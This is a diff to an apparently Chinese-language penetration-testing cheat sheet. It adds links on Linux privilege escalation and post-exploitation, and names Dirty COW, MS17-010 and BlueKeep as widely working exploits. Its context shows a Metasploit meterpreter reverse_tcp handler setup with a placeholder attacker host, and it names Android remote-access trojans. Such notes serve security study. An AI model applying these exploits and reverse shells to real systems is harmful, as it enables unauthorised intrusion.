@@ -156,13 +156,15 @@ nc
 
 ### 提权
 
-sudo提权
+sudo提权  
+http://next.uuzdaisuki.com/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/
 
-各类exp
+各类exp  
+典型通杀:脏牛CVE-2016-5195
 
 metasploit
 
-### 本地漏洞扫描工具
+本地漏洞扫描工具
 
 windows/linux exploit suggester
 
@@ -211,6 +213,9 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST xxx.xxx.xxx.xxx
 set LPORT 4444
 run
+
+常用后续命令
+https://www.cnblogs.com/backlion/p/9484949.html
 ```
 
 python直连反弹shell  
@@ -270,3 +275,9 @@ radmin
 DroidJack
 
 Dendroid
+
+### 典型windows-rce
+
+ms17-010 基本通杀
+
+cve-2019-0708 开放3389情况 windows7及之前通杀
